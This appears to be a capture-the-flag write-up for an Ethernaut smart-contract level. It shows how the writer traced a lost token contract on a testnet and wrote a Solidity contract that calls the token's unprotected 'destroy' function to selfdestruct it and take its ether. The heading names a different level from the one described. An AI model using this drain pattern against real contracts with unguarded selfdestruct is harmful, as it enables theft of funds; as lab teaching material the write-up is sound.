# 17. Preservation
<sup>Difficulty 6/10</sup>

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

## Solution

First things first: we need to recover all contract addresses.

From [Rinkeby Etherscan Transaction](https://rinkeby.etherscan.io/tx/0x3062e8149380de18307ddda9d56ef6d52802df79afee00856a53546fec43dd99) we found two trasnfers:

```
TRANSFER  0.001 Ether From 0xd991431d8b033ddcb84dad257f4821e9d5b38c33 To  0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2
TRANSFER  0.001 Ether From 0x0eb8e4771aba41b70d0cb6770e04086e5aee5ab2 To  0x88eb9c89128f1b206827d79280847cb7290b7ec0
```

The first transfer looks like the ethernaut one as:

```javascript
ethernaut.address
// -> '0xD991431D8b033ddCb84dAD257f4821E9d5b38C33'
```

Hence, we create a simple contract to exploit the `destroy` function of the `SimpleToken` contract:

```solidity
// clean up after ourselves
function destroy(address payable _to) public {
  selfdestruct(_to);
}
```

This function will destroy the contract and will "recover" all its ether.

```solidity
contract Recovery { 
    SimpleToken st;
    address payable public owner;
    constructor() public {
        owner = msg.sender;  // Me
    }
    function recover(address payable _tokenAddr) public returns (bool) {
        st = SimpleToken(_tokenAddr);
        st.destroy(owner);
    }
}
```

Then, invoking the `recover` function onto the second transfer address that we found `0x88Eb9C89128f1b206827D79280847cb7290B7ec0` led us to the achievement of the challenge!

```
／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
```

## OZ Corner

Contract addresses are deterministic and are calculated by `keccack256(address, nonce)` where the `address` is the address of the contract (or ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting [blog post](http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.
